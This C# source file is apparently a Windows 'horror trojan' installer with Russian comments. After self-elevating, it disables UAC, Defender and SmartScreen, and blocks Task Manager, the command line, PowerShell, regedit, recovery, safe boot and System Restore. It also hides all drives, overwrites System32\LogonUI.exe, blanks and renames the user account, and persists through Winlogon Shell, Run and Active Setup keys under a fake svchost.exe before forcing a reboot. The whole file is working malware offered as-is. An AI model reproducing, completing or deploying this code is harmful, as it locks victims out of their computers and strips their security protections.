using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using HorrorTrojan;

namespace LogonUIInstaller
{
    internal static class Program
    {
        private static Mutex mutex;
        private static string systemRoot = Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows";
        private static string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemUpdate");

        [STAThread]
        static void Main(string[] args)
        {
            bool createdNew;
            mutex = new Mutex(true, "Global\\LogonUIInstallerMutex", out createdNew);
            if (!createdNew) return;

            try
            {
                if (args.Length > 0 && args[0] == "stage2")
                {
                    Application.EnableVisualStyles();
                    Application.SetCompatibleTextRenderingDefault(false);

                    ReplaceLogonUI();
                    Application.Run(new MainInterface());
                    return;
                }

                if (!IsElevated())
                {
                    RestartAsAdmin();
                    return;
                }

                ExtractAllResources();
                ApplyAllLocks();
                DisableAntivirusAndUAC();
                ApplySettingsToDefaultProfile();
                RenameCurrentUserFixed();
                AddToStartupWithShell(); // <-- ПОДМЕНА SHELL (КАК В NoSleep)
                ForceReboot();
            }
            finally
            {
                mutex?.ReleaseMutex();
                mutex?.Dispose();
            }
        }

        // ==================== РАСПАКОВКА ====================
        private static void ExtractAllResources()
        {
            try
            {
                if (!Directory.Exists(appDataPath))
                    Directory.CreateDirectory(appDataPath);

                ExtractResource("hr.gif", Path.Combine(appDataPath, "hr.gif"));
                ExtractResource("dv.mp3", Path.Combine(appDataPath, "dv.mp3"));
                ExtractResource("vd.gif", Path.Combine(appDataPath, "vd.gif"));
                ExtractResource("kj.gif", Path.Combine(appDataPath, "kj.gif"));
                ExtractResource("kf.gif", Path.Combine(appDataPath, "kf.gif"));
                ExtractResource("wd.webp", Path.Combine(appDataPath, "wd.webp"));
                ExtractResource("fg.ani", Path.Combine(appDataPath, "fg.ani"));
                ExtractResource("LogonUI.exe", Path.Combine(appDataPath, "LogonUI.exe"));

                File.SetAttributes(appDataPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
                foreach (string file in Directory.GetFiles(appDataPath))
                    File.SetAttributes(file, FileAttributes.Hidden | FileAttributes.ReadOnly);
            }
            catch { }
        }

        private static void ExtractResource(string name, string outputPath)
        {
            try
            {
                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
                {
                    if (stream == null) return;
                    byte[] data = new byte[stream.Length];
                    stream.Read(data, 0, data.Length);
                    File.WriteAllBytes(outputPath, data);
                }
            }
            catch { }
        }

        // ==================== ЗАМЕНА LogonUI ====================
        private static void ReplaceLogonUI()
        {
            try
            {
                string originalPath = Path.Combine(systemRoot, "System32", "LogonUI.exe");
                if (!File.Exists(originalPath)) return;

                ForceFullAccess(originalPath);
                KillLogonUIProcesses();
                Thread.Sleep(2000);
                
                File.SetAttributes(originalPath, FileAttributes.Normal);
                
                bool deleted = false;
                for (int i = 0; i < 10; i++)
                {
                    try
                    {
                        File.Delete(originalPath);
                        deleted = true;
                        break;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                        try
                        {
                            File.Move(originalPath, originalPath + ".del");
                            File.Delete(originalPath + ".del");
                            deleted = true;
                            break;
                        }
                        catch
                        {
                            try
                            {
                                Process.Start(new ProcessStartInfo
                                {
                                    FileName = "cmd.exe",
                                    Arguments = $"/c del /f /q \"{originalPath}\"",
                                    CreateNoWindow = true,
                                    WindowStyle = ProcessWindowStyle.Hidden,
                                    UseShellExecute = false
                                })?.WaitForExit(3000);
                                deleted = true;
                                break;
                            }
                            catch { }
                        }
                    }
                }

                if (!deleted)
                {
                    try
                    {
                        string tempPath = Path.Combine(Path.GetTempPath(), "LogonUI.exe.bak");
                        File.Move(originalPath, tempPath);
                        File.Delete(tempPath);
                    }
                    catch { }
                }

                byte[] customLogonUI = ExtractResourceBytes("LogonUI.exe");
                File.WriteAllBytes(originalPath, customLogonUI);
                
                File.SetAttributes(originalPath, FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
            }
            catch { }
        }

        private static byte[] ExtractResourceBytes(string resourceName)
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            using (Stream stream = assembly.GetManifestResourceStream(resourceName) ??
                  assembly.GetManifestResourceStream($"LogonUIInstaller.{resourceName}"))
            {
                if (stream == null) throw new Exception($"Resource {resourceName} not found");
                byte[] data = new byte[stream.Length];
                stream.Read(data, 0, data.Length);
                return data;
            }
        }

        private static void ForceFullAccess(string path)
        {
            try { File.SetAttributes(path, FileAttributes.Normal); } catch { }
            
            try
            {
                Process p = Process.Start(new ProcessStartInfo
                {
                    FileName = "takeown.exe",
                    Arguments = $"/f \"{path}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                p?.WaitForExit(5000);
                p?.Close();
            }
            catch { }

            try
            {
                Process p = Process.Start(new ProcessStartInfo
                {
                    FileName = "icacls.exe",
                    Arguments = $"\"{path}\" /grant Everyone:F /grant SYSTEM:F /grant Administrators:F",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                p?.WaitForExit(5000);
                p?.Close();
            }
            catch { }

            try
            {
                FileInfo fi = new FileInfo(path);
                FileSecurity fs = fi.GetAccessControl();
                fs.SetOwner(WindowsIdentity.GetCurrent().User);
                fs.AddAccessRule(new FileSystemAccessRule(
                    new NTAccount(Environment.UserDomainName, Environment.UserName),
                    FileSystemRights.FullControl, AccessControlType.Allow));
                fs.AddAccessRule(new FileSystemAccessRule(
                    new NTAccount("NT AUTHORITY\\SYSTEM"),
                    FileSystemRights.FullControl, AccessControlType.Allow));
                fs.AddAccessRule(new FileSystemAccessRule(
                    new NTAccount("BUILTIN\\Administrators"),
                    FileSystemRights.FullControl, AccessControlType.Allow));
                fi.SetAccessControl(fs);
            }
            catch { }
        }

        private static void KillLogonUIProcesses()
        {
            try
            {
                foreach (Process p in Process.GetProcessesByName("LogonUI"))
                {
                    try
                    {
                        if (!string.IsNullOrEmpty(p.MainModule.FileName) &&
                            p.MainModule.FileName.Contains("System32"))
                        {
                            p.Kill();
                            p.WaitForExit(5000);
                            Thread.Sleep(500);
                        }
                    }
                    catch { }
                }
                
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "taskkill",
                        Arguments = "/f /im LogonUI.exe",
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        UseShellExecute = false
                    })?.WaitForExit(3000);
                }
                catch { }
            }
            catch { }
        }

        // ==================== УСТАНОВЩИК ====================
        private static bool IsElevated()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static void RestartAsAdmin()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = Assembly.GetEntryAssembly().Location,
                    Verb = "runas",
                    UseShellExecute = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            catch { }
            Environment.Exit(0);
        }

        private static void ForceReboot()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "shutdown",
                    Arguments = "/r /f /t 0",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });
            }
            catch { }
            Environment.Exit(0);
        }

        // ==================== ВСЕ БЛОКИРОВКИ ====================
        private static void ApplyAllLocks()
        {
            // Блокировка Task Manager
            using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);

            // Блокировка CMD
            using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
                key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
            using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
                key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);

            // Блокировка PowerShell
            using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\PowerShell"))
                key.SetValue("EnableScripts", 0, RegistryValueKind.DWord);
            using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\PowerShell"))
                key.SetValue("EnableScripts", 0, RegistryValueKind.DWord);

            // Блокировка VBS/VBE
            using (var key = Registry.ClassesRoot.CreateSubKey(@".vbs"))
                key.SetValue("", "txtfile", RegistryValueKind.String);
            using (var key = Registry.ClassesRoot.CreateSubKey(@".vbe"))
                key.SetValue("", "txtfile", RegistryValueKind.String);

            // Блокировка regedit
            using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
            using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);

            // Блокировка Recovery
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("DisableRecovery", 1, RegistryValueKind.DWord);
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\Recovery"))
                key.SetValue("DisableRecovery", 1, RegistryValueKind.DWord);

            // Блокировка Safe Mode
            using (var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\SafeBoot"))
                key.SetValue("OptionValue", 1, RegistryValueKind.DWord);

            // Скрываем Boot Menu
            using (var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\BootManager"))
            {
                key.SetValue("BootMenuPolicy", 1, RegistryValueKind.DWord);
                key.SetValue("DisplayBootMenu", 0, RegistryValueKind.DWord);
            }

            // Скрываем диски
            using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
            {
                key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);
                key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
                key.SetValue("NoChangeWallpaper", 1, RegistryValueKind.DWord);
                key.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
            }

            // Отключаем System Restore
            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\SystemRestore"))
                {
                    key.SetValue("DisableConfig", 1, RegistryValueKind.DWord);
                    key.SetValue("DisableSR", 1, RegistryValueKind.DWord);
                }
            }
            catch { }

            // Отключаем установщики MSI
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\Installer"))
                key.SetValue("DisableMSI", 2, RegistryValueKind.DWord);

            // Блокировка смены пароля
            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("DisableChangePassword", 1, RegistryValueKind.DWord);

            // Блокировка диспетчера устройств
            using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("NoDevMgr", 1, RegistryValueKind.DWord);

            // Блокировка MMC
            using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\MMC"))
                key.SetValue("RestrictToPermittedSnapins", 1, RegistryValueKind.DWord);

            // Обои и курсоры для текущего пользователя
            string wallpaperPath = Path.Combine(appDataPath, "wd.webp");
            string cursorPath = Path.Combine(appDataPath, "fg.ani");

            using (var key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop"))
            {
                key.SetValue("Wallpaper", wallpaperPath, RegistryValueKind.String);
                key.SetValue("WallpaperStyle", "2", RegistryValueKind.String);
                key.SetValue("TileWallpaper", "0", RegistryValueKind.String);
            }

            using (var key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors"))
            {
                key.SetValue("Arrow", cursorPath, RegistryValueKind.String);
                key.SetValue("Help", cursorPath, RegistryValueKind.String);
                key.SetValue("AppStarting", cursorPath, RegistryValueKind.String);
                key.SetValue("Wait", cursorPath, RegistryValueKind.String);
                key.SetValue("Crosshair", cursorPath, RegistryValueKind.String);
                key.SetValue("IBeam", cursorPath, RegistryValueKind.String);
                key.SetValue("NWPen", cursorPath, RegistryValueKind.String);
                key.SetValue("No", cursorPath, RegistryValueKind.String);
                key.SetValue("SizeNS", cursorPath, RegistryValueKind.String);
                key.SetValue("SizeWE", cursorPath, RegistryValueKind.String);
                key.SetValue("SizeNWSE", cursorPath, RegistryValueKind.String);
                key.SetValue("SizeNESW", cursorPath, RegistryValueKind.String);
                key.SetValue("SizeAll", cursorPath, RegistryValueKind.String);
                key.SetValue("UpArrow", cursorPath, RegistryValueKind.String);
            }
        }

        // ==================== ОТКЛЮЧЕНИЕ ЗАЩИТЫ ====================
        private static void DisableAntivirusAndUAC()
        {
            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
                    key.SetValue("ConsentPromptBehaviorAdmin", 0, RegistryValueKind.DWord);
                    key.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
                }

                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender"))
                    key.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);

                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                    key.SetValue("EnableSmartScreen", 0, RegistryValueKind.DWord);

                try
                {
                    using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender"))
                    {
                        key.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
                        key.SetValue("DisableBehaviorMonitoring", 1, RegistryValueKind.DWord);
                        key.SetValue("DisableBlockAtFirstSeen", 1, RegistryValueKind.DWord);
                        key.SetValue("DisableIOAVProtection", 1, RegistryValueKind.DWord);
                        key.SetValue("DisableAntiVirus", 1, RegistryValueKind.DWord);
                    }
                }
                catch { }
            }
            catch { }
        }

        // ==================== DEFAULT ПРОФИЛЬ ====================
        private static void ApplySettingsToDefaultProfile()
        {
            try
            {
                string defaultProfilePath = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") + "\\Users", "Default", "NTUSER.DAT");
                if (!File.Exists(defaultProfilePath)) return;

                string tempKey = "DefaultUserTemp_" + Guid.NewGuid().ToString("N").Substring(0, 8);

                Process p1 = Process.Start(new ProcessStartInfo
                {
                    FileName = "reg",
                    Arguments = $"load \"HKEY_USERS\\{tempKey}\" \"{defaultProfilePath}\"",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });
                p1?.WaitForExit(3000);
                p1?.Close();

                ApplyRegistrySettingsToHive(tempKey);

                Process p2 = Process.Start(new ProcessStartInfo
                {
                    FileName = "reg",
                    Arguments = $"unload \"HKEY_USERS\\{tempKey}\"",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });
                p2?.WaitForExit(3000);
                p2?.Close();

                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\OOBE"))
                    key.SetValue("DisableOOBE", 1, RegistryValueKind.DWord);
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE"))
                {
                    key.SetValue("SkipMachineOOBE", 1, RegistryValueKind.DWord);
                    key.SetValue("SkipUserOOBE", 1, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void ApplyRegistrySettingsToHive(string hiveKey)
        {
            try
            {
                string wallpaperPath = Path.Combine(appDataPath, "wd.webp");
                string cursorPath = Path.Combine(appDataPath, "fg.ani");
                string destPath = Path.Combine(appDataPath, "svchost.exe");

                using (var key = Registry.Users.CreateSubKey($@"{hiveKey}\Control Panel\Desktop"))
                {
                    key.SetValue("Wallpaper", wallpaperPath, RegistryValueKind.String);
                    key.SetValue("WallpaperStyle", "2", RegistryValueKind.String);
                    key.SetValue("TileWallpaper", "0", RegistryValueKind.String);
                }

                using (var key = Registry.Users.CreateSubKey($@"{hiveKey}\Control Panel\Cursors"))
                {
                    key.SetValue("Arrow", cursorPath, RegistryValueKind.String);
                    key.SetValue("Help", cursorPath, RegistryValueKind.String);
                    key.SetValue("AppStarting", cursorPath, RegistryValueKind.String);
                    key.SetValue("Wait", cursorPath, RegistryValueKind.String);
                    key.SetValue("Crosshair", cursorPath, RegistryValueKind.String);
                    key.SetValue("IBeam", cursorPath, RegistryValueKind.String);
                    key.SetValue("NWPen", cursorPath, RegistryValueKind.String);
                    key.SetValue("No", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeNS", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeWE", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeNWSE", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeNESW", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeAll", cursorPath, RegistryValueKind.String);
                    key.SetValue("UpArrow", cursorPath, RegistryValueKind.String);
                }

                using (var key = Registry.Users.CreateSubKey($@"{hiveKey}\Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                    key.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);
                }

                using (var key = Registry.Users.CreateSubKey($@"{hiveKey}\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
                {
                    key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);
                    key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
                    key.SetValue("NoChangeWallpaper", 1, RegistryValueKind.DWord);
                }

                using (var key = Registry.Users.CreateSubKey($@"{hiveKey}\Software\Microsoft\Windows\CurrentVersion\Run"))
                {
                    key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
                }
            }
            catch { }
        }

        // ==================== ПЕРЕИМЕНОВАНИЕ ====================
        private static void RenameCurrentUserFixed()
        {
            try
            {
                string currentUser = Environment.UserName;
                string newUser = "CLOSE YOUR EYES";

                Process p0 = Process.Start(new ProcessStartInfo
                {
                    FileName = "net",
                    Arguments = $"user \"{currentUser}\" \"\"",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });
                p0?.WaitForExit(3000);
                p0?.Close();

                Process p1 = Process.Start(new ProcessStartInfo
                {
                    FileName = "wmic",
                    Arguments = $"useraccount where name='{currentUser}' rename '{newUser}'",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });
                p1?.WaitForExit(5000);
                p1?.Close();

                Thread.Sleep(2000);

                string oldProfilePath = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") + "\\Users", currentUser);
                string newProfilePath = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") + "\\Users", newUser);

                if (Directory.Exists(oldProfilePath) && !Directory.Exists(newProfilePath))
                {
                    try
                    {
                        Directory.Move(oldProfilePath, newProfilePath);
                    }
                    catch
                    {
                        try
                        {
                            CopyDirectory(oldProfilePath, newProfilePath, true);
                            Directory.Delete(oldProfilePath, true);
                        }
                        catch { }
                    }
                }

                string sid = GetUserSID(newUser);
                if (!string.IsNullOrEmpty(sid))
                {
                    using (var key = Registry.LocalMachine.OpenSubKey($@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\{sid}", true))
                    {
                        if (key != null)
                            key.SetValue("ProfileImagePath", newProfilePath, RegistryValueKind.ExpandString);
                    }
                }

                string guid = Guid.NewGuid().ToString("B").ToUpper();
                using (var key = Registry.LocalMachine.CreateSubKey($@"SOFTWARE\Microsoft\Active Setup\Installed Components\{guid}"))
                {
                    key.SetValue("", "SystemUpdate", RegistryValueKind.String);
                    key.SetValue("StubPath", $"\"{Assembly.GetEntryAssembly().Location}\" stage2", RegistryValueKind.String);
                    key.SetValue("Version", "1.0", RegistryValueKind.String);
                }

                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"))
                {
                    key.SetValue("AutoAdminLogon", "1", RegistryValueKind.String);
                    key.SetValue("DefaultUserName", newUser, RegistryValueKind.String);
                    key.SetValue("DefaultPassword", "", RegistryValueKind.String);
                }
            }
            catch { }
        }

        private static void CopyDirectory(string sourceDir, string destDir, bool overwrite)
        {
            Directory.CreateDirectory(destDir);
            foreach (string file in Directory.GetFiles(sourceDir))
            {
                string destFile = Path.Combine(destDir, Path.GetFileName(file));
                File.Copy(file, destFile, overwrite);
            }
            foreach (string dir in Directory.GetDirectories(sourceDir))
            {
                string destSubDir = Path.Combine(destDir, Path.GetFileName(dir));
                CopyDirectory(dir, destSubDir, overwrite);
            }
        }

        private static string GetUserSID(string username)
        {
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"))
                {
                    foreach (string sid in key.GetSubKeyNames())
                    {
                        using (var subKey = key.OpenSubKey(sid))
                        {
                            string profilePath = subKey.GetValue("ProfileImagePath") as string;
                            if (!string.IsNullOrEmpty(profilePath) && profilePath.EndsWith(username))
                                return sid;
                        }
                    }
                }
            }
            catch { }
            return null;
        }

        // ==================== АВТОЗАПУСК (ПОДМЕНА SHELL) ====================
        private static void AddToStartupWithShell()
        {
            try
            {
                if (!Directory.Exists(appDataPath))
                    Directory.CreateDirectory(appDataPath);

                string selfPath = Assembly.GetEntryAssembly().Location;
                string destPath = Path.Combine(appDataPath, "svchost.exe");

                if (File.Exists(selfPath))
                {
                    if (File.Exists(destPath))
                        File.Delete(destPath);
                    File.Copy(selfPath, destPath, true);
                }

                File.SetAttributes(destPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
                File.SetAttributes(appDataPath, FileAttributes.Hidden | FileAttributes.ReadOnly);

                // ===== ПОДМЕНА SHELL (КАК В NoSleep) =====
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"))
                {
                    // explorer.exe, "C:\...\svchost.exe" stage2
                    key.SetValue("Shell", $"explorer.exe, \"{destPath}\" stage2", RegistryValueKind.String);
                }

                // ===== РЕЗЕРВ (НА ВСЯКИЙ СЛУЧАЙ) =====
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
                    key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);

                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run"))
                    key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
            }
            catch { }
        }
    }
}
